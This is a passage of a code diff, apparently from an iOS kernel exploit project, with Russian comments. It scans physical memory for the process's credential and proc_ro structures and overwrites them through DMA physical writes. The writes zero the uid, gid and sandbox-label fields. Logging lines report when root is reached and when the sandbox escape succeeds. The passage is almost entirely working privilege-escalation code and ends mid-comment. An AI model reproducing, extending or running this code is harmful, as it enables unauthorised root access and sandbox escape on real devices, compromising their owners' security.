+                    // [TBL-TEST] р.71 Q3-residual: ложится ли DMA-запись в ДИНАМИЧЕСКУЮ
+                    // pmap-таблицу (пост-boot пул — может быть вне статического CTRR)?
+                    // PTE→ctlPA в invalid-слот L3 нашего proc; readback ТОЛЬКО через
+                    // phystokv-алиас таблицы (свежий VA НЕ пробуем — р.71 Q4: паника).
+                    {
+                        uint64_t lvlS = 3, ltS = 0;
+                        uint64_t gpaS = vtophys_lvl(kconstant(cpuTTEP), kp_untag_ptr(selfProcM), &lvlS, &ltS);
+                        uint64_t l3tPA = ltS & ~0x3fffULL;
+                        uint64_t pteSrc = (gpaS && ltS && !kpFrameDeadly(ltS)) ? early_kread64(phystokv(ltS)) : 0;
+                        if ((pteSrc & 0x3) == 0x3 && l3tPA && ctlPA && svc && ttM && isTable) {
+                            uint64_t l3tKVA = phystokv(l3tPA);
+                            int freeI = -1;
+                            for (uint32_t i = 0; i < 2048; i++)
+                                if (early_kread64(l3tKVA + (uint64_t)i * 8) == 0) { freeI = (int)i; break; }
+                            if (freeI >= 0) {
+                                uint64_t pteA = (ctlPA & 0x0000ffffffffc000ULL) | (pteSrc & ~0x0000ffffffffc000ULL);
+                                kpPhysWrite8v2(svc, tsdV, ttM, isTable, l3tPA, (uint32_t)freeI * 8, pteA, r);
+                                uint64_t rbS = early_kread64(l3tKVA + (uint64_t)freeI * 8);
+                                kpNote(r, [NSString stringWithFormat:@"  [TBL-TEST] L3[%d] нашего proc: readback=%#018llx (ждём %#018llx) → %@",
+                                          freeI, rbS, pteA, rbS == pteA ? @"ДИНАМИЧЕСКИЕ ТАБЛИЦЫ ПИШУТСЯ ✓" : @"ДРОП (CTRR фенсит и их)"]);
+                                if (rbS == pteA)
+                                    kpPhysWrite8v2(svc, tsdV, ttM, isTable, l3tPA, (uint32_t)freeI * 8, 0, r);   // restore
+                            }
+                        }
+                    }
+                }
+                // 1.9.280: SCAN-Z2 — ПОЛНЫЙ физмап-скан (все недeadly кадры).
+                // 279: тип ucred ≠ типу proc (0x21) — фильтр по типу снят. Пропускаем
+                // только deadly-типы (таблицы) и PA-спаны SPTM/TXM (чтение EL2-домена
+                // через physical aperture = паника). Physmap — ЛИНЕЙНЫЙ
+                // (pa-gPhysBase+gVirtBase), не phystokv: у PAPT дыры, кадр мог утонуть.
+                // Две сигнатуры: (a) страница ucred — label(raw)@+0x78 + uid@+0x18 →
+                // ucredPA → контент-форж; (b) страница proc_ro — поле p_ucred==ucF +
+                // 3 соседних qword → roFieldPA → PSWAP-B ниже. Обе цели — data-фреймы,
+                // DMA туда ложится (р.72 Q3); таблицы не нужны вообще.
+                uint64_t roFieldPA = 0;
+                if (!pagePA && !pswapRoot && ucF && roF && gFrameTableVA) {
+                    uint32_t ucFieldOff = koffsetof(proc_ro, ucred);
+                    uint32_t uoff2 = (uint32_t)(ucF & 0x3fff);
+                    uint32_t roOff = (uint32_t)((roF + ucFieldOff) & 0x3fff);
+                    uint64_t labelQ = early_kread64(ucF + 0x78);
+                    uint32_t uid32 = (uint32_t)early_kread64(ucF + 0x18);
+                    uint8_t ucImg[0x100];
+                    for (uint32_t i = 0; i < 0x100; i += 8) *(uint64_t *)(ucImg + i) = early_kread64(ucF + i);
+                    uint64_t roFp0 = roOff >= 8 ? early_kread64(roF + ucFieldOff - 8) : 0;
+                    uint64_t roFp1 = early_kread64(roF + ucFieldOff + 8);
+                    uint64_t roFp2 = early_kread64(roF + ucFieldOff + 0x10);
+                    uint64_t pB = kconstant(physBase), pS = kconstant(physSize), vB = kconstant(virtBase);
+                    uint64_t sptmPA = pB + (kconstant(staticSptmBase) - kconstant(staticBase));
+                    uint64_t txmPA  = pB + (kconstant(staticTxmBase)  - kconstant(staticBase));
+                    uint64_t nF = pS >> 14;
+                    kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] старт: uoff=%#x label=%#llx uid=%u roOff=%#x ucF=%#llx frames=%#llx",
+                              uoff2, (unsigned long long)labelQ, uid32, roOff, (unsigned long long)ucF, (unsigned long long)nF]);
+                    kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] скип PA-спаны: SPTM %#llx..%#llx TXM %#llx..%#llx",
+                              (unsigned long long)sptmPA, (unsigned long long)(sptmPA + 0xF4000),
+                              (unsigned long long)txmPA, (unsigned long long)(txmPA + 0x64000)]);
+                    // 1.9.281: калибровка physmap-меппинга маркером ctlPA (0xCAFEBABE).
+                    // Какой путь реально читает DRAM на этом буте — linear (pa-pB+vB)
+                    // или PAPT (phystokv). Неверный ptov = молчаливый промах скана.
+                    BOOL useLinear = NO, mapOK = NO;
+                    if (ctlPA) {
+                        uint32_t mLin = (uint32_t)early_kread64(ctlPA - pB + vB);
+                        uint64_t papV = phystokv(ctlPA);
+                        uint32_t mPap = papV ? (uint32_t)early_kread64(papV) : 0;
+                        useLinear = (mLin == 0xCAFEBABE);
+                        mapOK = useLinear || (mPap == 0xCAFEBABE);
+                        kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] калибровка physmap: linear=%#010x papt=%#010x → %@",
+                                  mLin, mPap, useLinear ? @"LINEAR ✓" : (mPap == 0xCAFEBABE ? @"PAPT ✓" : @"ОБА МИМО — скан пропущен")]);
+                    }
+                    if (uoff2 + 0x100 <= 0x4000 && mapOK) {
+                        uint64_t reads = 0;
+                        uint64_t idx = 0;
+                        // kexproofv2 2.0.0: гистограмма frame-типов — ответ на
+                        // «тип не тот — понадобится гистограмма» (1.9.279).
+                        // Показывает, какими типами реально заняты кадры и
+                        // какой тип у страниц ucred/proc_ro.
+                        uint32_t typeHist[64];
+                        uint32_t typeNoTable = 0;
+                        memset(typeHist, 0, sizeof(typeHist));
+                        for (; idx < nF && (!pagePA || !roFieldPA); idx++) {
+                            uint64_t pa = pB + (idx << 14);
+                            if ((idx & 0x7FFF) == 0)
+                                kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] прогресс %#llx/%#llx (чтений %llu)",
+                                          (unsigned long long)idx, (unsigned long long)nF, (unsigned long long)reads]);
+                            if (pa >= sptmPA && pa < sptmPA + 0xF4000) continue;
+                            if (pa >= txmPA && pa < txmPA + 0x64000) continue;
+                            int t = kpFrameTypeOf(pa);
+                            if (t < 0) typeNoTable++;
+                            else if (t < 64) typeHist[t]++;
+                            if (t == 0x37 || t == 0xb || t == 0x15 || t == 0x18) continue;   // таблицы — deadly
+                            uint64_t pkva2 = useLinear ? (pa - pB + vB) : phystokv(pa);   // калиброванный путь
+                            if (!pkva2) continue;
+                            reads++;
+                            // (a) страница ucred: label + uid на тех же смещениях
+                            if (!pagePA && early_kread64(pkva2 + uoff2 + 0x78) == labelQ &&
+                                (uint32_t)early_kread64(pkva2 + uoff2 + 0x18) == uid32) {
+                                BOOL full = YES;
+                                for (uint32_t i = 0; i < 0x100; i += 8)
+                                    if (early_kread64(pkva2 + i) != *(uint64_t *)(ucImg + i)) { full = NO; break; }
+                                kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] ucred-кандидат pa=%#llx: label+uid сошлись, сверка 0x100 — %@",
+                                          (unsigned long long)pa, full ? @"СОШЛАСЬ ★" : @"мимо"]);
+                                if (full) pagePA = pa;
+                            }
+                            // (b) страница proc_ro: поле==ucF + 3 соседа (анти-ложные)
+                            if (!roFieldPA && roOff >= 8 && roOff + 0x18 < 0x4000 &&
+                                early_kread64(pkva2 + roOff) == ucF &&
+                                early_kread64(pkva2 + roOff - 8) == roFp0 &&
+                                early_kread64(pkva2 + roOff + 8) == roFp1 &&
+                                early_kread64(pkva2 + roOff + 0x10) == roFp2) {
+                                roFieldPA = pa + roOff;
+                                kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] ★ proc_ro поле: pa=%#llx (p_ucred==ucF + соседи) — PSWAP-B вооружён",
+                                          (unsigned long long)roFieldPA]);
+                            }
+                        }
+                        kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] финиш: кадров=%#llx чтений=%llu ucredPA=%#llx roFieldPA=%#llx — %@",
+                                  (unsigned long long)idx, (unsigned long long)reads,
+                                  (unsigned long long)pagePA, (unsigned long long)roFieldPA,
+                                  (pagePA || roFieldPA) ? @"ЦЕЛЬ НАЙДЕНА ★" : @"мимо — по census-типам доберём"]);
+                        // kexproofv2 2.0.0: дамп гистограммы типов (по сканированным кадрам)
+                        NSMutableString *hg = [NSMutableString string];
+                        for (int hi = 0; hi < 64; hi++)
+                            if (typeHist[hi]) [hg appendFormat:@" %d:%u", hi, typeHist[hi]];
+                        kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] гистограмма типов (кадров %llu, нет-таблицы %u):%@",
+                                  (unsigned long long)idx, typeNoTable, hg.length ? hg : @" пусто"]);
+                    }
+                }
+                // [PSWAP-B] roFieldPA из скана — тот же p_ucred swap, но без walker'а
+                // (таблица proc_ro deadly системно, 276/278/279). physmap-форж ucred,
+                // один physwrite8 в поле, readback-верификация, root, restore.
+                if (roFieldPA && !pswapRoot && svc && ttM && isTable && ucF && roF) {
+                    uint64_t ucFieldVA = roF + koffsetof(proc_ro, ucred);
+                    uint8_t *fp3 = valloc(0x4000);
+                    for (uint32_t i = 0; i < 0x100; i += 8) *(uint64_t *)(fp3 + i) = early_kread64(ucF + i);
+                    *(uint32_t *)(fp3 + 0x18) = 0;  // cr_uid
+                    *(uint32_t *)(fp3 + 0x1c) = 0;  // cr_ruid
+                    *(uint32_t *)(fp3 + 0x20) = 0;  // cr_svuid
+                    *(uint32_t *)(fp3 + 0x28) = 0;  // cr_groups[0]
+                    *(uint32_t *)(fp3 + 0x68) = 0;  // cr_rgid
+                    *(uint32_t *)(fp3 + 0x6c) = 0;  // cr_svgid
+                    *(uint64_t *)(fp3 + 0x78) = 0;  // cr_label = NULL → sandbox off
+                    *(uint64_t *)(fp3 + 0x100) = 0xC0DEC0DEC0DEC0DEULL;   // маркер верификации KVA
+                    mlock(fp3, 0x4000);
+                    uint64_t fpPA3 = vtophys(ttM, (uint64_t)fp3);
+                    uint64_t fpKVA3 = 0;
+                    if (fpPA3) {
+                        uint64_t k1 = phystokv(fpPA3);
+                        uint64_t k2 = fpPA3 - kconstant(physBase) + kconstant(virtBase);
+                        uint64_t m1 = k1 ? early_kread64(k1 + 0x100) : 0;
+                        uint64_t m2 = early_kread64(k2 + 0x100);
+                        if (m1 == 0xC0DEC0DEC0DEC0DEULL) fpKVA3 = k1;
+                        else if (m2 == 0xC0DEC0DEC0DEC0DEULL) fpKVA3 = k2;
+                        kpNote(r, [NSString stringWithFormat:@"  [PSWAP-B] KVA-верификация маркером: papt=%@ linear=%@ → KVA=%#llx",
+                                  m1 == 0xC0DEC0DEC0DEC0DEULL ? @"✓" : @"✗", m2 == 0xC0DEC0DEC0DEC0DEULL ? @"✓" : @"✗",
+                                  (unsigned long long)fpKVA3]);
+                    }
+                    kpNote(r, [NSString stringWithFormat:@"  [PSWAP-B] forge page: PA=%#llx KVA=%#llx → поле %#llx",
+                              (unsigned long long)fpPA3, (unsigned long long)fpKVA3, (unsigned long long)roFieldPA]);
+                    if (fpKVA3 && kpLooksLikeKernelPointer(fpKVA3)) {
+                        BOOL wP = kpPhysWrite8v2(svc, tsdV, ttM, isTable, roFieldPA & ~0x3fffULL,
+                                                 (uint32_t)(roFieldPA & 0x3fff), fpKVA3, r);
+                        uint64_t rb = early_kread64(ucFieldVA);
+                        kpNote(r, [NSString stringWithFormat:@"  [PSWAP-B] запись=%@ readback=%#llx (ждём %#llx) → %@",
+                                  wP ? @"kr=0" : @"МИМО", (unsigned long long)rb, (unsigned long long)fpKVA3,
+                                  rb == fpKVA3 ? @"P_UCRED ПЕРЕКЛЮЧЁН ✓" : @"НЕ ПРИЛИПЛО"]);
+                        if (rb == fpKVA3) {
+                            uid_t gu = getuid(); gid_t gg = getgid();
+                            kpNote(r, [NSString stringWithFormat:@"  [PSWAP-B] getuid()=%u getgid()=%u", gu, gg]);
+                            if (gu == 0) {
+                                pswapRoot = YES;
+                                kpNote(r, @"=== ROOT ДОСТИГНУТ: getuid()==0 — p_ucred swap через DART physwrite (scan-найденное поле, physmap-форж) ===");
+                                FILE *fpf = fopen("/private/var/mobile/kexproof-root-probe.txt", "w");
+                                kpNote(r, [NSString stringWithFormat:@"  [PSWAP-B] sandbox-проба (запись в /var/mobile): %@",
+                                          fpf ? @"УСПЕХ — label снят, песочницы нет" : @"ОТКАЗ"]);
+                                if (fpf) { fputs("root via p_ucred swap (scan)\n", fpf); fclose(fpf); }
+                            }
+                            usleep(1000000);
+                            kpPhysWrite8v2(svc, tsdV, ttM, isTable, roFieldPA & ~0x3fffULL,
+                                           (uint32_t)(roFieldPA & 0x3fff), ucF, r);   // restore
+                            kpNote(r, [NSString stringWithFormat:@"  [PSWAP-B] restore: readback=%#llx (ждём %#llx)",
+                                      (unsigned long long)early_kread64(ucFieldVA), (unsigned long long)ucF]);
+                        }
+                    }
+                    munlock(fp3, 0x4000); free(fp3);
+                }
+                // ДВЕ валидации PA перед любой записью: (1) phystokv(pagePA) читается
+                // и первый qword совпадает с [pageVA]; (2) uid-поле == getuid().
+                uint64_t pkva = pagePA ? phystokv(pagePA) : 0;
+                uint64_t q0b = early_kread64(pageVA);
+                uint64_t q0a = pkva ? early_kread64(pkva) : 0;
+                uint32_t uidViaPA = pkva ? (uint32_t)early_kread64(pkva + uoff + 0x18) : 0xdead;
+                BOOL paOK = pkva && (q0a == q0b) && (uidViaPA == (uint32_t)getuid());
+                // 1.9.281: fallback на линейный physmap, если PAPT-алиас попал в дыру
+                if (!paOK && pagePA) {
+                    uint64_t pkvaL = pagePA - kconstant(physBase) + kconstant(virtBase);
+                    uint64_t q0L = early_kread64(pkvaL);
+                    uint32_t uidL = (uint32_t)early_kread64(pkvaL + uoff + 0x18);
+                    if (q0L == q0b && uidL == (uint32_t)getuid()) { pkva = pkvaL; q0a = q0L; uidViaPA = uidL; paOK = YES; }
+                }
+                // 1.9.252: кросс-валидация через DART-read, если physmap-алиас ucred
+                // страницы сам охраняется (pkva=0 или q0a не сошёлся).
+                if (!paOK && pagePA && svc) {
+                    uint8_t cimg[0x4000];
+                    if (kpPhysRead16K(svc, tsdV, ttM, isTable, pagePA, cimg, r)) {
+                        uint64_t q0c = 0; memcpy(&q0c, cimg, 8);
+                        uint32_t uidViaC = 0; memcpy(&uidViaC, cimg + uoff + 0x18, 4);
+                        if (q0c == q0b && uidViaC == (uint32_t)getuid()) {
+                            paOK = YES;
+                            kpNote(r, @"  [FORGE] валидация через DART-read: СОШЛАСЬ (physmap-алиас не нужен)");
+                        }
+                    }
+                }
+                kpNote(r, [NSString stringWithFormat:@"  [FORGE] pageVA=%#llx pagePA=%#llx uoff=%#x — валидация PA: %@",
+                          (unsigned long long)pageVA, (unsigned long long)pagePA, uoff, paOK ? @"СОШЛАСЬ" : @"НЕ СОШЛАСЬ — записи не будет"]);
+                // kexproofv2 2.0.0 [INPL] — быстрый root без форжа страницы и
+                // без proc_ro (RO-зона): точечный in-place патч uid-кластера
+                // через DART physwrite8 прямо в странице ucred. Data-фреймы
+                // пишутся (контрольная страница, 1024 dword — ПРИЛИПЛО).
+                // Поля (карта р.18): cr_uid|cr_ruid +0x18 (8B=0), cr_svuid
+                // +0x20 (RMW — S-поля +0x24 не трогаем), groups[0] +0x28
+                // (RMW — groups[1] не трогаем), rgid|svgid +0x68 (8B=0),
+                // cr_label +0x78 (8B=0 → sandbox off).
+                BOOL inplRoot = NO;
+                if (paOK && svc && ttM && isTable && pagePA && uoff + 0x80 <= 0x4000) {
+                    uint64_t pgPA = pagePA & ~0x3fffULL;
+                    uint64_t q20 = early_kread64(ucF + 0x20);
+                    uint64_t q28 = early_kread64(ucF + 0x28);
+                    uint64_t n20 = q20 & 0xFFFFFFFF00000000ULL;   // сбросить только cr_svuid
+                    uint64_t n28 = q28 & 0xFFFFFFFF00000000ULL;   // сбросить только groups[0]
+                    BOOL w1 = kpPhysWrite8v2(svc, tsdV, ttM, isTable, pgPA, uoff + 0x18, 0, r);
+                    BOOL w2 = kpPhysWrite8v2(svc, tsdV, ttM, isTable, pgPA, uoff + 0x20, n20, r);
+                    BOOL w3 = kpPhysWrite8v2(svc, tsdV, ttM, isTable, pgPA, uoff + 0x28, n28, r);
+                    BOOL w4 = kpPhysWrite8v2(svc, tsdV, ttM, isTable, pgPA, uoff + 0x68, 0, r);
+                    BOOL w5 = kpPhysWrite8v2(svc, tsdV, ttM, isTable, pgPA, uoff + 0x78, 0, r);
+                    uint32_t cruN = (uint32_t)early_kread64(ucF + 0x18);
+                    uint32_t cgdN = (uint32_t)early_kread64(ucF + 0x28);
+                    uint64_t lblN = early_kread64(ucF + 0x78);
+                    uid_t guN = getuid(); gid_t ggN = getgid();
+                    kpNote(r, [NSString stringWithFormat:@"  [INPL] physwrite8: %d%d%d%d%d | readback cr_uid=%u groups0=%u cr_label=%#llx | getuid()=%u getgid()=%u",
+                              w1, w2, w3, w4, w5, cruN, cgdN, (unsigned long long)lblN, guN, ggN]);
+                    if (guN == 0 || cruN == 0) {
+                        inplRoot = YES;
+                        kpNote(r, @"=== ROOT ДОСТИГНУТ: getuid()==0 — INPL in-place ucred через DART physwrite8 (без форжа, без proc_ro) ===");
+                        FILE *fp = fopen("/private/var/mobile/kexproof-root-probe.txt", "w");
+                        kpNote(r, [NSString stringWithFormat:@"  [INPL] sandbox-проба (запись в /var/mobile): %@",
+                                  fp ? @"УСПЕХ — label снят, песочницы нет" : @"ОТКАЗ — label на месте"]);
+                        if (fp) { fputs("root via INPL in-place ucred patch\n", fp); fclose(fp); }
+                    } else {
+                        kpNote(r, @"  [INPL] не прилипло — откат не нужен (контент не изменился), иду в тяжёлый форж");
+                    }
+                }
+                // kexproofv2 2.0.0: тяжёлый форж — только если INPL не взял.
+                // 1.9.251: форжим ВСЮ 16KB-страницу — ucred сидит на uoff=0x38b0,
+                // 4KB записи не доставало (rect 64×64 = 0x4000 в tsdF ниже).
+                if (!inplRoot && paOK && uoff + 0xc0 <= 0x4000) {
+                    uint8_t fbuf[0x4000];
+                    for (uint32_t i = 0; i < 0x4000; i += 8) *(uint64_t *)(fbuf + i) = early_kread64(pageVA + i);
+                    *(uint32_t *)(fbuf + uoff + 0x18) = 0;   // cr_uid
+                    *(uint32_t *)(fbuf + uoff + 0x1c) = 0;   // cr_ruid
+                    *(uint32_t *)(fbuf + uoff + 0x20) = 0;   // cr_svuid
+                    *(uint32_t *)(fbuf + uoff + 0x28) = 0;   // cr_groups[0]
+                    *(uint32_t *)(fbuf + uoff + 0x68) = 0;   // cr_rgid
+                    *(uint32_t *)(fbuf + uoff + 0x6c) = 0;   // cr_svgid
+                    *(uint64_t *)(fbuf + uoff + 0x78) = 0;   // cr_label = NULL (sandbox off)
+                    IOSurfaceLock(srcS, 0, NULL);
+                    uint8_t *sp2 = (uint8_t *)IOSurfaceGetBaseAddress(srcS);
+                    if (sp2) memcpy(sp2, fbuf, 0x4000);
+                    IOSurfaceUnlock(srcS, 0, NULL);
+                    uint32_t fPFN = (uint32_t)(pagePA >> 14);
+                    // слоты (restore'нуты к этому моменту) — заново на ucredPagePA
+                    for (int j = 0; j < nSlots; j++) {
+                        uint64_t nq = (slotForm[j] == 1) ? (((uint64_t)fPFN << 32) | (origQs[j] & 0xFFFFFFFFULL))
+                                     : (slotForm[j] == 2) ? pagePA
+                                     : (slotForm[j] == 3) ? (pagePA >> 14)
+                                     : ((origQs[j] & 0xFFFFFFFF00000000ULL) | (uint64_t)fPFN);
+                        early_kwrite64(slotVAs[j], nq);
+                        uint64_t rb = early_kread64(slotVAs[j]);
+                        kpNote(r, [NSString stringWithFormat:@"  [FORGE] слот#%d → ucredPagePA: %#018llx — %@", j, (unsigned long long)rb,
+                                  rb == nq ? @"ПРИЛИПЛО" : @"МИМО"]);
+                    }
+                    // DEP-хиты — перепатч на ucredPFN (покрываем оба пути prepare)
+                    for (int i = 0; i < nDep; i++) {
+                        if (hitForm[i] < 0) continue;   // 1.9.221: пропущенные (zone-VA не нашлись) — не трогаем, там physmap-RO
+                        uint64_t nq = (hitForm[i] == 1) ? ((hitOld[i] & 0x3fffULL) | pagePA)
+                                    : (hitForm[i] == 3) ? (((uint64_t)fPFN << 32) | (hitOld[i] & 0xffffffffULL))
+                                    : (hitForm[i] == 4) ? ((hitOld[i] & 0xffffffff00000000ULL) | fPFN)
+                                    : (hitForm[i] == 5) ? ((hitOld[i] & 0xffffffff00000000ULL) | fPFN)
+                                    : (uint64_t)fPFN;
+                        early_kwrite64(hitAddr[i], nq);
+                    }
+                    if (nDep) kpNote(r, [NSString stringWithFormat:@"  [FORGE] DEP-хиты перепатчены на ucredPFN (%d шт)", nDep]);
+                    // victim#2 submit (bit43=0 — свежий rebuild из отравленного источника)
+                    // 1.9.251: rect 64×64×4 = 0x4000 — форж покрывает всю 16KB-страницу ucred
+                    // 1.9.272: на СВЕЖЕМ pipe — dst пересериализуется с ucredPFN
+                    // (персистентный кэш главного pipe держит ctlPA от victim#1).
+                    uint8_t tsdF[0x1B0];
+                    memcpy(tsdF, tsdV, sizeof(tsdF));
+                    *(uint32_t *)(tsdF + 0) = srcID;
+                    *(uint32_t *)(tsdF + 4) = dstID;
+                    *(uint64_t *)(tsdF + 8) = 1;
+                    *(uint32_t *)(tsdF + 0x0C) = 64;
+                    *(uint32_t *)(tsdF + 0x10) = 64;
+                    io_connect_t v3 = IO_OBJECT_NULL;
+                    kern_return_t ok3 = IOServiceOpen(svc, mach_task_self(), 0, &v3);
+                    kern_return_t fkr = -1;
+                    if (ok3 == KERN_SUCCESS && v3) {
+                        fkr = IOConnectCallMethod(v3, 1, NULL, 0, tsdF, sizeof(tsdF), NULL, NULL, NULL, NULL);
+                        kpNote(r, [NSString stringWithFormat:@"  [FORGE] victim#2 submit (ucredPA, fresh pipe): kr=0x%x — жду DMA в ucred", fkr]);
+                        usleep(400000);
+                        IOServiceClose(v3);
+                    } else {
+                        kpNote(r, [NSString stringWithFormat:@"  [FORGE] fresh pipe#2: open kr=0x%x — fallback на главный", ok3]);
+                        fkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdF, sizeof(tsdF), NULL, NULL, NULL, NULL);
+                        usleep(400000);
+                    }
+                    uid_t gu = getuid(); gid_t gg = getgid();
+                    uint32_t cru = (uint32_t)early_kread64(ucF + 0x18);
+                    uint64_t lbl = early_kread64(ucF + 0x78);
+                    kpNote(r, [NSString stringWithFormat:@"  [FORGE] getuid()=%u getgid()=%u | cr_uid=%u cr_label=%#llx",
+                              gu, gg, cru, (unsigned long long)lbl]);
+                    if (gu == 0) {
+                        kpNote(r, @"=== ROOT ДОСТИГНУТ: getuid()==0 — форж ucred через DART physwrite РАБОТАЕТ (мимо SPTM RO) ===");
+                        FILE *fp = fopen("/private/var/mobile/kexproof-root-probe.txt", "w");
+                        kpNote(r, [NSString stringWithFormat:@"  [FORGE] sandbox-проба (запись в /var/mobile): %@",
+                                  fp ? @"УСПЕХ — label снят, песочницы нет" : @"ОТКАЗ — label на месте"]);
+                        if (fp) { fputs("root via DART physwrite\n", fp); fclose(fp); }
+                    }
+                } else if (!inplRoot && paOK) {
+                    kpNote(r, [NSString stringWithFormat:@"  [FORGE] ucred слишком глубоко в странице (uoff=%#x > 0xf40) — нужен src > 4КБ, следующий билд", uoff]);
+                }
+            }
+        }
+    } else {
+        kpNote(r, @"=== контрольная не изменилась — см. выше ===");
+    }
+    // 1.9.219: restore DEP-хитов после форжа (яд формы ucredPFN не живёт дальше)
+    if (changed) for (int i = 0; i < nDep; i++) if (hitForm[i] > 0 && hitForm[i] != 4) early_kwrite64(hitAddr[i], hitOld[i]);
+    // === 1.9.160 фаза 2: DART PTE patch с живым mapping (раунд 36) ===
+    // 1.9.249: фаза 2 ВЫКЛЮЧЕНА насовсем — она убивает прогон ПОСЛЕ вердикта:
+    // 247 умер в SPC-Z (zone bound per-cpu, panic 165106), 248 — тихий ресет в
+    // той же фазе без паник-лога. Её цель (PTE-цепь) теперь идёт через CHAIN.
+    if (0 && isTable && victim != IO_OBJECT_NULL) {
+        uint64_t wVA = kpM2TClientVA(r, isTable, victim, @"p2-victim");
+        uint64_t ucVA = kpLooksLikeKernelPointer(wVA) ? kp_untag_ptr(early_kread64(wVA + 0x30)) : 0;
+        uint64_t provVA = kpLooksLikeKernelPointer(ucVA) ? kp_untag_ptr(early_kread64(ucVA + 0xe8)) : 0;
+        kpNote(r, [NSString stringWithFormat:@"  [P2] victim wrap=%#llx UC(fObject)=%#llx provider=%#llx",
+                  (unsigned long long)wVA, (unsigned long long)ucVA, (unsigned long long)provVA]);
+        uint64_t pipeVA = 0, mapVA = 0, dartVA = 0;
+        if (kpLooksLikeKernelPointer(provVA)) {
+            // 1.9.166 (р.39): pipe по битмаске активных [provider+0x180] → первый
+            // set-бит → [provider+0x140+idx*8]; scheduler = [pipe+0xb8] (не provider!)
+            uint64_t mask = early_kread64(provVA + 0x180);
+            int pidx = -1;
+            for (int b = 0; b < 8; b++) if (mask & (1ULL << b)) { pidx = b; break; }
+            if (pidx >= 0) pipeVA = kp_untag_ptr(early_kread64(provVA + 0x140 + (uint64_t)pidx * 8));
+            kpNote(r, [NSString stringWithFormat:@"  [P2] pipeMask=%#llx → pipe[%d]=%#llx",
+                      (unsigned long long)mask, pidx, (unsigned long long)pipeVA]);
+        }
+        if (kpLooksLikeKernelPointer(pipeVA)) mapVA = kp_untag_ptr(early_kread64(pipeVA + 0x78));
+        // [mapper+0x30] = IODARTMapperNub (proxy, таблиц не держит) — хопим по
+        // [+0x30] до терминального AppleT8110DART (vt file 0x7dafcb0), 1-4 хопа
+        uint64_t ks4 = kconstant(base) - 0xfffffff007004000ULL;
+        uint64_t hopObj = mapVA;
+        for (int h = 0; h < 4 && kpLooksLikeKernelPointer(hopObj); h++) {
+            uint64_t hvt = kp_untag_ptr(early_kread64(hopObj));
+            uint64_t hFile = hvt ? hvt - ks4 : 0;
+            kpNote(r, [NSString stringWithFormat:@"  [P2] dart-hop%d: obj=%#llx vt(file)=%#llx%@", h,
+                      (unsigned long long)hopObj, (unsigned long long)hFile,
+                      (uint32_t)hFile == 0x7dafcb0 ? @" = AppleT8110DART ✓" :
+                      (uint32_t)hFile == 0x7e6ab28 ? @" = IODARTMapperNub" :
+                      (uint32_t)hFile == 0x7e6b118 ? @" = IODARTMapper" : @""]);
+            if ((uint32_t)hFile == 0x7dafcb0) { dartVA = hopObj; break; }   // 1.9.167: file-сравнение по low32 (hFile = полный prelink VA 0xfffffff0…)
+            uint64_t nxt = kp_untag_ptr(early_kread64(hopObj + 0x30));
+            if (nxt == hopObj) break;
+            hopObj = nxt;
+        }
+        if (!dartVA) dartVA = kpLooksLikeKernelPointer(hopObj) ? hopObj : 0;
+        kpNote(r, [NSString stringWithFormat:@"  [P2] pipe=%#llx mapper=%#llx dart=%#llx",
+                  (unsigned long long)pipeVA, (unsigned long long)mapVA, (unsigned long long)dartVA]);
+        // 1.9.165: vtables всех звеньев (file-оффсеты) — идентификация классов
+        // цепочки (scheduler=0 и dart≠0x7dafcb0 в 1.9.162 требуют правки оффсетов)
+        {
+            uint64_t ks3 = kconstant(base) - 0xfffffff007004000ULL;
+            uint64_t v1 = kpLooksLikeKernelPointer(provVA) ? kp_untag_ptr(early_kread64(provVA)) : 0;
+            uint64_t v2 = kpLooksLikeKernelPointer(pipeVA) ? kp_untag_ptr(early_kread64(pipeVA)) : 0;
+            uint64_t v3 = kpLooksLikeKernelPointer(mapVA) ? kp_untag_ptr(early_kread64(mapVA)) : 0;
+            kpNote(r, [NSString stringWithFormat:@"  [P2] vtables(file): prov=%#llx pipe=%#llx mapper=%#llx",
+                      (unsigned long long)(v1 ? v1 - ks3 : 0),
+                      (unsigned long long)(v2 ? v2 - ks3 : 0),
+                      (unsigned long long)(v3 ? v3 - ks3 : 0)]);
+        }
+        // 1.9.163: валидация walker'а на известных VA + гейт диких дерефов —
+        // 1.9.162 ребутнул девайс без паники = SPTM/EL2 ресет на чтении
+        // немапнутого/защищённого указателя из скана dartObj.
+        kpNote(r, [NSString stringWithFormat:@"  [P2] kvtophys: provVA→%#llx dartVA→%#llx (0 = walker не резолвит zone-map)",
+                  (unsigned long long)kvtophys(provVA), (unsigned long long)kvtophys(dartVA)]);
+        __block uint64_t pteVA = 0, origPTE = 0;   // 1.9.174: __block — scanTbl пишет их из рекурсивного блока (CI failure)
+        __block uint64_t ptePAFound = 0;   // 1.9.196: точный PA из скана (pa+o) — walker имеет слепые зоны, P4-охота по kvtophys(pteVA)=0 дала ложные "0 соседей"
+        __block uint64_t ptePAMask = 0x000003FFFE000000ULL;   // 1.9.189: маска PA-поля — ставится по кодировке найденного PTE
+        uint64_t kslide2 = kconstant(base) - 0xfffffff007004000ULL;
+        // 1.9.164 (р.38): таргетированный PTE — дикий скан dartObj УБРАН (он и
+        // ребутил девайс SPTM-ресетом). Путь: provider+0xb8=scheduler →
+        // entry-array(+0xc8) → наша запись (credit +0xc3c==0x10) →
+        // cmd(IODMACommand, vt 0x7afa9e8) = [entry+0x98/+0xa0] → mapObj=[cmd+0x70]
+        // → DVA=[mapObj+0xa0] → pageIdx=DVA>>14 → walk L0/L1/L2/leaf (valid=bit0,
+        // child=(e<<4)&0x3ffffffc000) → PTE. Патч ТОЛЬКО при совпадении PA-маски.
+        uint64_t cmdVA = 0, dva = 0, dvaLen = 0;
+        // 1.9.184 (р.47): mapping персистит в СВЯЗНОМ СПИСКЕ на pipe —
+        // [pipe+0x178]=head нод (нода: +0x00=size, +0x18/+0x20 link-пара),
+        // [pipe+0x180]=count. [pipe+0x88] = пулы команд + interrupt sources (не
+        // mapping!). Идём по нодам: cmd(IODMACommand, vt 0x7afa9e8) в ноде →
